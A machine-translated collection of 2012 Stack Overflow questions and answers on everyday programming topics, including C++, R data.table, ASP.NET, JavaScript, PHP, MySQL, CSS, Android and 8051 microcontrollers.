如果您希望 B 简单地访问 CallMe()，那么您不需要在 B 中重新定义它。它将从 C 继承它。如果您希望 B 覆盖 CallMe，那么您需要这样做：

```
class C
{
  public:
    virtual void CallMe() { //definition }

};

class B : public C
{
 public:
   void CallMe() { //redefine it here }

}; 
```

请注意，我从您的语法错误中假设您是 JAVA 程序员。方法在 C++ 中不会自动标记为虚拟，如果要使用多态，则必须将它们标记为虚拟，并且必须从指针中使用它们才能使其工作。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-13T13:57:39.670

```
class C{ 
  callMe(){} 
friend class A;
}; 

class A{

//use call me here

}; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-13T13:57:24.417

您需要提供以下实例`C`：

```
class C {
public: // has to be public
  void callMe() const {}
};

class A{
public:
    A(const C& inst) : inst(inst) {}

    void foo() {
        inst.callMe();
    }
private:
    const C& inst;
}; 
```

# gmail - 如何使用 Google Apps 脚本为 Google 日历/电子邮件小工具提供服务？

> ID：11935725
> 
> 赞同：0
> 
> 时间：2012-08-13T13:53:39.910
> 
> 标签：gmail, google-apps-script, google-calendar-api, google-apps, google-gadget

我想使用 Apps 脚本为我们的 Google Apps for Business 域开发一个日历/gmail 小工具，以利用它提供的所有好处。

复制 Hello World 小工具示例时：

```
<?xml version="1.0" encoding="UTF-8" ?> 
<Module>
  <ModulePrefs title="hello world example" /> 
  <Content type="html">
    <![CDATA[ 
      Hello, world!
    ]]>
  </Content> 
</Module> 
```

使用模板 XML `doGet()`：

```
function doGet(e) {
  var output = ContentService.createTextOutput();
  var xml = '<?xml version="1.0" encoding="UTF-8" ?>\n<Module>\n<ModulePrefs title="Calendar Gadget" />\n<Content type="html"><![CDATA[\nHello, world!\n]]></Content>\n</Module>';
  output.setContent(xml);
  output.setMimeType(ContentService.MimeType.XML);
  return output;
} 
```

生成的服务内容与安装正常的示例小工具相同，但从 GAS 提供的内容未被识别为有效。日历会忽略它，GMail 会声明它无效。

> 无效的小工具规范。确保 URL 正确且小工具不包含错误。

使用 *.xml 文件名提供 Google Apps 小工具是否是要求的一部分？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-13T16:15:33.347

doGet() 不会逐字返回 XML（或 HTML）。提供给浏览器的确切内容和 doGet() 返回的内容是有区别的。

因此，您的问题的答案是 - 是的，您需要有一个用于 Google 小工具的 XML 文件，并且不能使用 Apps 脚本。您也许可以做的是使用 Apps 脚本来写出 XML 文件。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-14T22:06:27.753

使用 ContentService 提供的内容应该与提供的输入相同。请确保将网络应用程序配置为允许匿名访问。

# java - 在 Java 中寻找简单的持久消息缓冲区

> ID：11935727
> 
> 赞同：7
> 
> 时间：2012-08-13T13:53:43.543
> 
> 标签：java, messaging, rabbitmq

我正在寻找一个简单的持久缓冲区作为 Java 应用程序中 JSON 消息的临时存储。内存使用应该是相对恒定的，并且不依赖于缓冲区中的消息数量。能够从过去的某个时间点重播消息会很高兴。删除旧消息应该是有效的。需要能够处理 1m 条消息/小时。

目前，我的应用程序使用本地 RabbitMQ 代理，它将消息铲到远程 RabbitMQ 代理。当远程代理关闭或不接受消息时，本地 RabbitMQ 代理的内存使用量会随着队列长度的增加而增加，最终它会停止接受消息。我想将其换成基于本地磁盘的缓冲区和将消息复制到远程 RabbitMQ 代理的线程。

有人有想法么？我看过 Kafka，但对于我的用例来说似乎有点过分了。MongoDB 是一种可能性，但我担心它的内存使用情况。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-13T14:11:59.650

在任何系统中，内存使用始终是一个问题。我将 MongoDB 用于生产，当我与类似的解决方案（CouchDB、CouchBase、redis.io）进行比较时，MongoDB 在内存管理和易于实现方面非常出色。但我应该承认，我从来没有机会更详细地测试 Riak。

我正在存储 5.000.000 个用户记录，其中包含 4 个索引字段，所有用户会话都在一个使用消息服务的 rest/web 服务 api 后面。

我的消息服务使用同一服务器上的另一个数据库实例。我的用户记录至少有 20 个字段，会话记录只有 5 个字段。即使在繁重的加载过程中，我的 ubuntu 服务器也从未使用超过 10 GB 的内存。

希望这有助于弄清楚。

ps：一切都取决于数据模型以及您如何实现基础架构。

问候，

**编辑：**

我认为[这](http://www.slideshare.net/mongodb/mongodb-as-message-queue)是一个关于使用 MongoDB 进行消息传递的好幻灯片。

还有一篇关于 MongoDB 和消息传递的好[文章。](http://captaincodeman.com/2011/05/28/simple-service-bus-message-queue-mongodb/)

您可以使用测试代码并查看结果是否适合您的解决方案。如果您进行测试，请不要忘记分享您的结果。

# r - 对满足所有可能条件的条件的所有值求和

> ID：11935728
> 
> 赞同：3
> 
> 时间：2012-08-13T13:53:45.073
> 
> 标签：r, data.table

我有一个 data.table，如下所示：

```
a <- data.table(color=c("Red","Blue","Red","Green","Red","Blue","Blue"), count=c(1,2,6,4,2,1,1),include=c(1,1,1,1,0,0,1))

> a
     color count include
[1,]   Red     1       1
[2,]  Blue     2       1
[3,]   Red     6       1
[4,] Green     4       1
[5,]   Red     2       0
[6,]  Blue     1       0
[7,]  Blue     1       1 
```

我希望创建一个新的 data.table，它只有唯一的颜色值，以及每个匹配 include=1 的计数列的总和，如下所示：

```
 colour total
[1,]   Red     7
[2,]  Blue     2
[3,] Green     4 
```

我尝试了以下方法，过去我已经取得了一些成功：

```
> a[,include == 1,list(total=sum(count)),by=colour]
Error in `[.data.table`(a, , include == 1, list(quantity = sum(count)),  : 
  Provide either 'by' or 'keyby' but not both 
```

当`a`没有键和键为 时，也会收到同样的错误消息`colour`。我也尝试过，将键设置为`colour`，以下内容：

```
> a[,include == 1,list(quantity=sum(count))]
Error in `[.data.table`(a, , include == 1, list(quantity = sum(count))) : 
  Each item in the 'by' or 'keyby' list must be same length as rows in x (7): 1 
```

我找不到任何其他好的解决方案。非常感谢任何帮助。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-13T14:05:46.447

这应该工作

```
library(data.table)
a <- data.table(color=c("Red","Blue","Red","Green","Red","Blue","Blue"), count=c(1,2,6,4,2,1,1),include=c(1,1,1,1,0,0,1))
a[include == 1, list(total=sum(count)), keyby = color]

   color total
1:  Blue     3
2: Green     4
3:   Red     7 
```

* * *

从马修编辑：

或者如果`include`采用（仅）值`0`然后`1`：

```
a[, list(total=sum(count*include)), keyby = color] 
```

或者如果`include`包含其他值，则：

```
a[, list(total=sum(count*(include==1))), keyby = color] 
```

其中`NA`s 可能需要考虑。

通过避免矢量扫描，这些可能会更有效`i`，但这在很大程度上取决于数据大小和属性。这些只需要与最大组一样大的工作内存，而`include==1`in`i`需要至少分配一个与`nrow(a)`.

# c# - 在 ASP.NET 页上填充表

> ID：11935729
> 
> 赞同：6
> 
> 时间：2012-08-13T13:53:54.353
> 
> 标签：c#, visual-studio-2010, datagrid, webforms

关于表（在这种情况下为单列）人口的简单问题。尽管这似乎是一个简单的问题，但我从未参与过前端领域，所以就这样吧。

布局为 2 列 8 行。就像是。

```
Name        A
LastName    B
Age         C
BirthDate   D
... 
```

第 1 列是稳定的，如果你愿意，“标题”不会​​改变。

A,B,C,D 是查询数据库的结果。所以，我能想到的选择是：

1.  绘制一个 2Column - 8Row 表并将 TextBoxes 放置在 A、B、C、D... 字段中。所以稍后可以用查询的结果填充它们（这个选项不是最“漂亮”的选项，因为 TextBoxes 改变了旨在使用 .CSS 文件被整个页面吸收的设计。

2.  设置数据网格。我认为这里的问题是必须更改某些 A、B、C、D 字段以供以后查询使用。而且我不确定 Datagrids 是否适合这一点。

我有解决这个问题的“好方法”吗？提前致谢。

**编辑。**

A、B、C、D 数据保存在 DataSet 中。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-08-13T15:09:28.137

To me, the way you're describing the data doesn't really lend itself too well for a `DataGrid`. This control works best for data that you plan to display in a standard tabular style, where the column names go across the top and then you display the row(s) of values underneath. It's also a little unclear to me if you are intending to bind one or many instances of your Object (which I will just call `Person` for now) to the UI.

Let's go ahead and define that object:

```
public class Person {
    public String Name { get; set; }
    public String LastName { get; set; }
    public int Age { get; set; }
    public DateTime BirthDate { get; set; }
} 
```

To bind a single instance of `Person` to your UI, a simple HTML table should work fine. I'm using `TextBoxes` to display the values here, but if you don't need to edit them then just use `Label`s instead.

```
<table>
    <tr><td>Name:</td><td><asp:TextBox ID="txtName" runat="server" /></td></tr>
    <tr><td>Last Name:</td><td><asp:TextBox ID="txtLastName" runat="server" /></td></tr>
    <tr><td>Age:</td><td><asp:TextBox ID="txtAge" runat="server" /></td></tr>
    <tr><td>Birthdate:</td><td><asp:TextBox ID="txtBirthDate" runat="server" /></td></tr>                  
</table> 
```

It's pretty trivial at this point to bind the properties from `Person` to their respective controls on the page using the code-behind.

If you wanted to use this same layout to display multiple instances of `Person` on a page, go with the [ASP.net Repeater](http://msdn.microsoft.com/en-us/magazine/cc163780.aspx). The markup for this would look more like:

```
 <asp:Repeater ID="repPeople" runat="server">
    <ItemTemplate>
        <table>
            <tr><td>Name:</td><td><asp:TextBox ID="txtName" runat="server" Text='<%# Eval("Name") %>' /></td></tr>
            <tr><td>Last Name:</td><td><asp:TextBox ID="txtLastName" runat="server" Text='<%# Eval("LastName") %>' /></td></tr>
            <tr><td>Age:</td><td><asp:TextBox ID="txtAge" runat="server" Text='<%# Eval("Age") %>' /></td></tr>
            <tr><td>Birthdate:</td><td><asp:TextBox ID="txtBirthDate" runat="server" Text='<%# String.Format("{0:d}", Eval("BirthDate")) %>' /></td></tr>                  
        </table>                
    </ItemTemplate>
</asp:Repeater> 
```

In the code-behind, you just bind a collection of `Person` to the `DataSource` property on the `Repeater`:

```
protected void Page_Load(object sender, EventArgs e) {

    // A simple example using Page_Load
    List<Person> people = new List<Person>();
    for (int i = 0; i < 10; i++) {
        people.Add(new Person() {Name = "Test", Age = 10, BirthDate=DateTime.Now, LastName = "Test"});
    }

    if (!IsPostBack) {
        repPeople.DataSource = people;
        repPeople.DataBind();
    }

} 
```

**Note:** You could accomplish a similar layout using CSS instead of tables, however the same principles apply between binding a single vs multiple objects. Just replace the table layout in this example with whatever markup you ultimately define.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-13T14:04:57.873

WebForms 中有一个表格控件，您应该可以从 DataSet 中填充它，请参阅 MSDN 文档：http: [//msdn.microsoft.com/en-us/library/system.web.ui.webcontrols.table.aspx](http://msdn.microsoft.com/en-us/library/system.web.ui.webcontrols.table.aspx)

# ios - 分析语音模式 IOS

> ID：11935734
> 
> 赞同：-2
> 
> 时间：2012-08-13T13:54:26.397
> 
> 标签：ios, audio, speech-recognition

我正在寻找一种方法/库来分析语音模式。比如说，房间里有 6 个人。我想通过语音识别每一个。

非常感谢任何提示。

德米特里

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-12T17:52:59.887

> 将一段长的连续录音分割成只有一个说话者在说话的块的任务 - 没有关于每个说话者的语音特征的任何先验知识 - 称为“说话者分类”。[您可以在wikipedia 页面](http://en.wikipedia.org/wiki/Speaker_diarisation)上找到研究代码的链接。
> 
> 如果您有每个声音的先前录音，并且宁愿进行分类，这是一个稍微不同的问题（说话人识别或说话人识别）。[此处](http://mistral.univ-avignon.fr/)提供了相关的软件工具（请注意，像 Sphinx 或 HTK 这样的通用语音识别包足够灵活，可以被哄骗去做）。

在这里回答[https://dsp.stackexchange.com/questions/3119/library-to-differentiate-people-by-their-voice-timbre](https://dsp.stackexchange.com/questions/3119/library-to-differentiate-people-by-their-voice-timbre)

# eclipse - 如何在eclipse中展平包？

> ID：11935741
> 
> 赞同：3
> 
> 时间：2012-08-13T13:54:50.747
> 
> 标签：eclipse, view, package, explorer, flat

我正在尝试在 eclipse 4.2 Juno 中创建一个扁平的项目层次结构——这是撰写本文时的最新版本。

我已经在**Package Explorer中启用了****Package Presentation -> Flat**但这并没有什么区别，视图仍然是分层的。

 **我找不到任何提供改进包导航体验的插件。我只是想要最高效的配置，即不需要点击展开/折叠箭头的布局！

有什么建议么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-13T14:07:25.853

结果发现“Flat”选项不起作用，因为该项目在 Eclipse 眼中不是 Java 项目。

我刚刚从我们的 SCM (svn) 中检查了一个 Maven 项目。**我注意到Package Explorer**中的项目文件夹图标上没有“J” 。然后我做了**右键单击-> 配置-> 转换为 Maven 项目**来修复。**

# ios - prepareForSegue：对象

> ID：11935745
> 
> 赞同：1
> 
> 时间：2012-08-13T13:55:01.377
> 
> 标签：ios, xcode, ios5, xcode4.3, ios6

我的应用程序有核心数据和两个视图 CoursesTableViewController 和 DetailViewController。

如果用户点击 Detail Disclosure 按钮转到 DetailViewController 以显示一些详细信息。

该应用程序将 didSelectRowAtIndexPath 和 didDeselectRowAtIndexPath 用于其他事情。

**CoursesTableViewController.m**

```
- (void)prepareForSegue:(UIStoryboardSegue *)segue sender:(id)sender
{

    if ([[segue identifier] isEqualToString:@"showDetail"]) {
        NSIndexPath *indexPath = [self.tableView indexPathForSelectedRow];
        NSManagedObject *object = [[self fetchedResultsController] objectAtIndexPath:indexPath];
        [[segue destinationViewController] setDetailItem:object];

    }

} 
```

**DetailViewController.h**

```
@property (strong, nonatomic) id detailItem;

@property (weak, nonatomic) IBOutlet UITextField *courseCodeLabel;
@property (weak, nonatomic) IBOutlet UITextField *courseNameLabel; 
```

**细节视图控制器.m**

```
@interface DetailViewController ()
- (void)configureView;
@end

@implementation DetailViewController

@synthesize detailItem = _detailItem;
@synthesize courseCodeLabel = _courseCodeLabel;
@synthesize courseNameLabel = _courseNameLabel;

#pragma mark - Managing the detail item

- (void)setDetailItem:(id)newDetailItem
{
    if (_detailItem != newDetailItem) {
        _detailItem = newDetailItem;

        // Update the view.
        [self configureView];
    }
}

- (void)configureView
{
    // Update the user interface for the detail item.

    if (self.detailItem) {
        self.courseCodeLabel.text = [[self.detailItem valueForKey:@"courseCode"] description];
        self.courseNameLabel.text = [[self.detailItem valueForKey:@"courseName"] description];

    }
}

- (void)viewDidLoad
{
    [super viewDidLoad];
    // Do any additional setup after loading the view, typically from a nib.
    [self configureView];
}

- (void)viewDidUnload
{
    [super viewDidUnload];
    // Release any retained subviews of the main view.
    self.courseCodeLabel = nil;
    self.courseNameLabel = nil;

} 
```

问题是当我点击 Detail Disclosure 时，segue 效果很好，但在 DetailViewController 中， courseCodeLabel 和 courseNameLabel 中没有值。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T14:04:59.220

导入并尝试投射目标视图控制器。

```
- (void)prepareForSegue:(UIStoryboardSegue *)segue sender:(id)sender {

if ([[segue identifier] isEqualToString:@"showDetail"]) {
    NSIndexPath *indexPath = [self.tableView indexPathForSelectedRow];
    NSManagedObject *object = [[self fetchedResultsController] objectAtIndexPath:indexPath];

DetailViewController * detailVC = (DetailViewController *)[segue destinationViewController];

[detailVC setDetailItem:object];

}

} 
```

# javascript - 返回 true，在 javascript 中破坏代码

> ID：11935746
> 
> 赞同：0
> 
> 时间：2012-08-13T13:55:02.577
> 
> 标签：javascript, jquery, return

具有以下代码：

```
function test(x) {
   if(x=='a') return false;
   return true;
}

if(y ==x) {
    return test('a');
    group['ids']= inputs.val();
    console.log(group);
} 
```

为什么`return true`只是通过不继续超越来破坏我的代码`return`？

注意：我希望`return test()`'s 的答案来控制它是否应该继续使用代码或不

## 更新

我已经做了类似的事情：

```
var response = test('b');
if (response==false) return false;
... more code here ... 
```

但我想避免在每次调用该函数时都这样做

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-13T13:57:49.623

因为这`return`几乎在**所有**编程语言中都是如此：它

1.  退出函数并
2.  返回一个值

如果您需要执行其他代码，请将其放在 return 语句之前。

**编辑：**我看到了你的编辑，但它并没有改变那个（和每个）上下文的本质`return`。它将继续停止当前范围的流动，返回最近的具有值的更高范围（在您的情况下，为真或假）。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-13T14:02:09.350

`return`顾名思义，关键字将程序流控制**返回**给调用函数，并可选择设置函数的**返回**值。

这在每一种类 C 语言中都以相同的方式工作。

您可能想要做的是类似 Delphi 的方法，其中关键字的`Result`工作方式不同 - 它只是设置函数终止时将使用的返回值，但不会立即终止函数。

```
function() {
  var result = someDefaultValue;

  if (someCondition)
    result = otherValue;

  if (otherCondition)
    result = yetAnotherValue;

  return result;
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-13T13:58:14.463

尝试将 return 放在最后，因为 return true 会中断执行，之后什么都不会执行

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-08-13T13:58:18.030

return 关键字导致函数在解释器到达该关键字时结束（'return'），并且在 return 语句之后（在同一函数中）不继续处理任何内容。

你可以重写你所拥有的：

```
group['ids']= inputs.val();
console.log(group);
return true; 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-08-13T13:58:38.923

当 return 语句执行时，当前函数的执行结束，程序的控制权返回到调用函数的上下文。return 语句之后的任何内容都不会被执行。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-08-13T13:59:16.430

我通常会找出哪些场景是坏的/错误`return false;`的，然后继续寻找正确的代码。

```
function Testmcdooder (test) {
    if (test === false) {
        // just exit up here
        return false;            
    }

    // now all of this code will run only if we're fine
    group['ids']= inputs.val();
    console.log(group);
} 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2012-08-13T14:07:54.843

该`return`语句存在于函数中。我认为你宁愿想要一个`if`声明：

```
if (y == x) {
  if (test('a')) {
    group['ids']= inputs.val();
    console.log(group);
  }
} 
```

如果您还想在确定其他语句是否应该运行后返回该值：

```
if (y == x) {
  if (test('a')) {
    group['ids']= inputs.val();
    console.log(group);
    return true;
  } else {
    return false;
  }
} 
```

或者：

```
if (y == x) {
  var cond = test('a');
  if (cond) {
    group['ids']= inputs.val();
    console.log(group);
  }
  return cond;
} 
```

# php - 在 PHP 中从 strpos() 评估布尔值

> ID：11935747
> 
> 赞同：-3
> 
> 时间：2012-08-13T13:55:04.890
> 
> 标签：php, if-statement, boolean, strpos

这是我的代码，

```
 $em= strpos($str, 'something');
  $em2= strpos($str, 'something2');
  $em3= strpos($str, 'something3');
////////triggering only if either of them exist

  if (($em!== false)||($em2!== false)||($em3!== false)) {
  some action
  } 
```

我的编码正确吗？或者我错过了什么？请建议。

应该是这样吗？

```
 if (!(($em== false)||($em2== false)||($em3 == false))) { 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-13T13:57:41.917

要检查是否`strpos()`没有找到您需要使用的子字符串（`===`比较值*和*类型），因为与.`strpos()``0``false``==`

**编辑：**作者编辑了他的问题。该答案涵盖了原始问题。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-13T13:57:37.063

如果要检查布尔值，则应始终使用`===`or `!==`。

主要原因是在 PHP 中，`$Test == 1`或者`$Test == TRUE`如果`($Test)`$Test 的值不为空则相同。

关于你的括号。如果您有超过 1 个要应用的逻辑，请使用它们，如果没有，则可选。

```
if($Test === TRUE OR $Foo === TRUE){

} 
```

和

```
if($Test === TRUE OR ($Foo === TRUE AND $Bar === TRUE)){

} 
```

此外，不要使用`||`or`&&`来检查`TRUE`or ，而是`FALSE`使用`OR`or`AND`反对布尔值。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-13T14:01:36.770

两种情况都给出相同的结果。没有正确提及您的意图是什么。你这里有什么错误吗？

您可以在[http://www.phpsyntax.blogspot.in找到更多信息](http://www.phpsyntax.blogspot.in)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-13T14:04:52.173

如果您在 $str 中的文本中搜索 something,something2,something3 就可以了。

但是，如果您想从 $str 中的某物、某物 2 或某物 3 中找到一个字符串，那么问题就在这里。

你应该看看这个 php.net/manual/en/function.strpos.php

问候

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-08-13T13:57:25.540

您的一些括号 ( `( )`) 不是必需的，但它应该像这样工作。

```
if (!($em=== false || $em2=== false || $em3 === false)) {
       // do something
} 
```

# mysql - 如何使用 MySQL 比较两个逗号分隔的字符串列表

> ID：11935750
> 
> 赞同：4
> 
> 时间：2012-08-13T13:55:07.630
> 
> 标签：mysql, list

我使用了一个名为“containsAll()”的 Java 方法来检查 ArrayLists 是否有共同的内容。

假设我有一个列表 A（一行）和 MySQL 表中的其他几个列表（在“名称”列中，逐行）。所有列表都包含逗号分隔的字符串（列表中至少有一个字符串）-名称或其他。

现在，我想检查是否可以在“名称”列的任何行中找到列表 A 中的所有字符串。结果集应显示“名称”中匹配的所有行，包括行/列表必须具有列表 A 中的所有字符串，并且可以具有其他字符串。

例一

A：“T先生”

```
____name_________________________________________
 'Hannibal'
 'Hannibal','Face','Murdock','Mr.T','Donald Duck'
 'Face','Donald Duck'
 'Superman','Chuck Norris','Mr.T'
_________________________________________________ 
```

结果集：'Hannibal','Face','Murdock','Mr.T','Donald Duck' -AND-'Superman',Chuck Norris','Mr.T'

* * *

例二

答：“洛基”、“T先生”、“阿波罗”

```
 ______name__________________________________________________
 'Hannibal','Face','Murdock','Donald Duck','Superman','Mr.T'
 'Rocky','Apollo','Ivan'
 'Apollo', 'Superman','Hannibal','Rocky','Mr.T','Chuck Norris'
 'Rocky','Mr.T','Apollo','Chuck Norris'
_____________________________________________________________ 
```

结果集：'Apollo'、'Superman'、'Hannibal'、'Rocky'、'Mr.T'、'Chuck Norris' -AND- 'Rocky'、'Mr.T'、'Apollo'、'Cuck Norris'

我想知道是否可以使用 MySQL 查询来执行这些结果。先感谢您。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-13T14:15:45.623

看来您想做一个数组交集，除了您的数组是单列。可以做到，但速度很慢，难以调试，并且无法利用关系数据库的强大功能。更好的方法是将您的表模式更改为如下所示：

表组

```
group_id int unsigned not null auto_increment primary key,
character_list text 
```

表 members_in_group

```
group_id int unsigned not null,
group_member varchar(45) not null 
```

然后你可以这样查询：

```
SELECT group_id, character_list
FROM groups g 
  JOIN members_in_groups m USING (group_id)
WHERE m.group_member IN ('Mr. T', ...); 
```

The `groups` table is probably very like your current table. The `members_in_groups` table is the same data chopped up into easily searchable parts.

ETA given your comment, this should work *if* you can guarantee that each `character_list` contains only *one* instance of each character:

```
SELECT group_id, 
       SUM(CASE m.group_member IN ('Mr. T', 'Apollo', 'Rocky') THEN 1 ELSE 0 END) AS tally, 
       character_list
FROM groups g
  JOIN members_in_groups m ON (g.group_id=m.group_id)
GROUP BY group_id
  HAVING SUM(CASE m.group_member IN ('Mr. T', 'Apollo', 'Rocky') THEN 1 ELSE 0 END) = 3; 
```

In this case the `HAVING` clause must equal 3 because there are 3 members in `IN ('Mr. T', 'Apollo', 'Rocky')`.

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2019-11-13T10:28:52.290

I solved this issue by using the [REGEXP](https://dev.mysql.com/doc/refman/8.0/en/regexp.html) function in MySQL:

```
SELECT * FROM `table` WHERE `column` REGEXP("(value1|value2|value3)"); 
```

* * *

## 回答 #3

> 赞同：-3
> 
> 时间：2012-08-13T13:58:19.123

SELECT * FROM tbl_name WHERE field_name LIKE '%\'Mr.T\'%'

# java - Java：如何在已经写入的文本之后在文本文件中写入更多文本

> ID：11935753
> 
> 赞同：0
> 
> 时间：2012-08-13T13:55:21.473
> 
> 标签：java, text

我想增量写入一个文本文件，即写入第一个字符串，然后程序应该检查是否有文本并应该转到下一行写入下一个字符串等。

有任何想法吗？

我在想程序应该以某种方式检查文件中是否写了一些东西并转到第一个空白行。但我不知道用哪些语句来做到这一点。

或者，我可以将所有内容添加到一个字符串中，最后一起打印。但我更喜欢第一个选项..

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-13T13:56:34.027

您需要使用附加模式打开文件。例如

```
 FileOutputStream fos = new FileOutputStream(pathtoFile, true);
   fos.write("Your new content".getBytes()); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-05-29T20:17:49.650

基本上首先检查文件是否为空，如果不是，则将内容附加到文件末尾。

```
BufferedReader br = new BufferedReader(new FileReader("path_to_File"));     
if (br.readLine() == null) {    //checks if file is empty
System.out.println("File is empty");
} 
```

然后附加到文件中，您可以执行以下操作：

```
FileWriter fWriter = new FileWriter(file.getName(),true);
BufferedWriter bWriter = new BufferedWriter(fWriter);
bWriter.write(data); 
```

# css - 无法将元素移动到更靠近浮动元素

> ID：11935756
> 
> 赞同：1
> 
> 时间：2012-08-13T13:55:29.180
> 
> 标签：css

![图片。](../Images/e9f9e9b732bf6c0b4c657be22f80b904.png)

为什么不能`#navbar`进一步向上移动？我试过`margin-top`了，但没有用。只有一个非常大的值有一些效果，但是定位太倾斜了。

包含所有 3个`#container`元素。

```
#container {
position:relative;
margin: 0 auto;
width:790px;
}

#chicklogo {
float:left;
border:1px solid black;
}

#rightext {
float:left;
border:1px solid black;
}

#navbar {
clear:both;
border:1px solid blue;
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-13T13:59:07.957

它不能，因为`#navbar`已经`clear:both`并且将要落在最高的浮动元素之下。从您的图像中，您可以看到它`#rightext`更高并且`#navbar`在它下面齐平。

如果您为徽标和右侧文本提供相同的高度，那么您的导航将位于两者下方。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-13T14:04:15.793

我创建了一个[JS Fiddle 来演示](http://jsfiddle.net/Sohnee/Ksz3b/)否定性`margin-top`，这意味着导航栏将与前面的元素重叠，即使它设置为`clear: both`.

理想情况下，您会降低元素的高度，`#righttext`因为看起来该元素中的空白会导致您的布局问题，但如果不可能，负边距顶部也可以工作。

# sharepoint-2007 - 装载 SharePoint 库时出现系统错误 67

> ID：11935760
> 
> 赞同：0
> 
> 时间：2012-08-13T13:55:33.970
> 
> 标签：sharepoint-2007, windows-server-2003

我创建了一个库，我正在尝试将该库安装在我们的一台运行 Windows Server 2003 的服务器上。我可以将该站点安装在我自己的运行 XP 的机器上，但是当我尝试将它安装在服务器上时抛出系统错误 67。我正在使用`net use z: \\sharepointsite`将它安装在两台机器上。显然，服务器操作系统和 PC 操作系统之间存在差异，这使我无法安装它。有谁知道解决此问题的方法或解决方法？提前致谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-14T12:41:30.007

好的，经过一番挖掘后，我发现 Windows Server 机器上的 WebClient 服务已关闭。打开服务器后，可以使用`net use http://sharepointsite/folder`.

# android - 关于粘性意图 ACTION_BATTERY_CHANGED

> ID：11935761
> 
> 赞同：0
> 
> 时间：2012-08-13T13:55:37.087
> 
> 标签：android, android-intent

我正在使用这段代码：

```
Intent i = getApplicationContext().registerReceiver(null, new IntentFilter(Intent.ACTION_BATTERY_CHANGED)); 
```

据我所知`i`，如果 ACTION_BATTERY_CHANGED 没有发生，则应该为空，但它永远不会为空，并且总是返回相同的数据。当我使用广播接收器时它工作得很好。收到 Intent 后需要删除吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-13T14:02:06.853

一旦您注册了粘性意图，就会始终为您提供最后广播的数据。所以这就是你总是接收数据的原因

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-12-01T05:20:54.133

粘性 = 粘附结果的属性 = 操作系统所遵循的意图称为粘性意图

通常您使用 sendBroadcast(Intent) 发送广播接收器，但是当您调用此方法 sendStickyBroadcast(Intent) 时，这意味着可以将广播 Intent 指定为粘性，在这种情况下，它将在发送后由系统**保留。**但默认情况下 Intent.ACTION_BATTERY_CHANGED 意图是粘性的。

在此处阅读完整的帖子[http://iphoidtech.com/uncategorized/what-is-stcky-intent/](http://iphoidtech.com/uncategorized/what-is-stcky-intent/)

# salesforce - 无法从 Salesforce 中选择用户 ID

> ID：11935763
> 
> 赞同：0
> 
> 时间：2012-08-13T13:55:50.367
> 
> 标签：salesforce, soql

我正在尝试从 Salesforce 中选择用户的下属，但查询很简单

```
SELECT Id FROM User WHERE ManagerId=xxxxxxxxx 
```

当我运行时返回一堆空值

```
SELECT Id,Name FROM User WHERE ManagerId=xxxxxxxx 
```

我得到了正确的名字，仍然没有 ID。

这是权限问题吗？当我登录到门户网站时，我找不到任何东西。

我正在通过沙盒环境中的 API 运行查询。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T14:08:20.993

试试这个（两者都对我有用）：

```
Id myId = [Select Id From User Where Username = 'myUserName'].Id;
System.debug('#### myId: ' + myId);

List<User> myIdList = [Select Id From User Where Username = 'myUserName' Limit 1];
System.debug('#### myId from list: ' + myIdList[0].Id); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-13T23:55:04.083

门户许可证不允许查询用户。但是，您仍然可以通过在输入字段中使用的 OwnerId、CreatedById、LastModifiedById 访问用户的名称。

IE ：

如果您想通过门户访问用户，您需要一个自定义对象并通过触发器将您的记录与用户同步。

# microcontroller - 在 AT89C2051 上使用 WILLAR 烧录程序

> ID：11935776
> 
> 赞同：0
> 
> 时间：2012-08-13T13:56:25.613
> 
> 标签：microcontroller, 8051, atmel

当我使用 AT89C2051 烧录程序时`WILLAR`，例如：

```
#include <reg51.h>
#define port P3
void delay(unsigned int); 
void main(void)
{
    for(;;)
    {
       port = 0x0;
       delay(1000);
       port = 0x0ff;
       delay(1000);
    }
}

void delay(unsigned int a)
{
    unsigned int i;
    unsigned int j;
    for(i=0; i<a; i++)
    for(j=0; j<120; j++);
} 
```

它显示一条消息：`The data out of range will be ignored`。但是如果我使用端口 P1 而不是端口 P3，我的程序会成功烧录。

问题出在哪里？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-01-09T09:22:16.257

端口 3 是多用途的特殊保留形式`timer/read/write/interrupt/`。其他端口是通用的。port0 和 port1 可能有上拉，您不想全局定义端口 3，而是可以在程序中使用 P3 和十六进制值

`port=0xff`代替`port=0xfff`

